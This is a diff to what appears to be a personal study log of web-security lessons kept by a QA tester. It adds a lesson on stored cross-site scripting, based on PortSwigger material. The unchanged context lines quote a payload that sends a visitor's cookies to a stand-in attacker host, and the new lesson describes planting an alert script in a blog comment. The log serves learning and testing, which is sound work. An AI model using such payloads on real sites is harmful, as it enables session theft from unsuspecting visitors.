@@ -136,3 +136,16 @@
 * **The Payload:** `<script>alert(1)</script>` is the "Hello World" of XSS.
 * **Impact:** If I can run `alert(1)`, I can also run `fetch('attacker.com?cookie=' + document.cookie)` and steal their session.
 
+## Lesson 12: Stored XSS [13.12.2025]
+**Focus:** Persistent JavaScript Injection
+
+**Resource:** PortSwigger
+* [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
+* [Stored, Blind, Reflected and DOM - Everything Cross--Site Scripting (XSS)](https://youtu.be/hQEQ-KJh06M?si=xuCQgOm4aGJWZ-AN)
+
+**Learnings:**
+* **Difference:** Reflected requires a link; Stored is a trap left on the page.
+* **The Experiment:** I posted a comment with `<script>alert(1)</script>`. Now, anyone who reads the blog gets the popup.
+* **QA Insight:** I need to test all "Save" fields (User Bio, Comments, Notes) for XSS. If I save a script and it executes when I view it later, it's Stored XSS.
+
+
